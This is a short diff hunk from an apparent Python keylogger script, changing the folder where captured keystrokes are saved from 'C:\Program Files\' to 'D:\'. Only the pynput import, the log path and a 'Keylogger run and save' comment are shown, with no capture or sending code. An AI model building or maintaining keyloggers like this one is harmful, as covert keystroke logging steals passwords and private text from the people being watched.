@@ -6,7 +6,7 @@ import time
 from pynput import keyboard
 
 # Path
-log_dir = "C:\\Program Files\\"
+log_dir = "D:\\"
 log_file = os.path.join(log_dir, "logs.txt")
 
 # Keylogger run and save
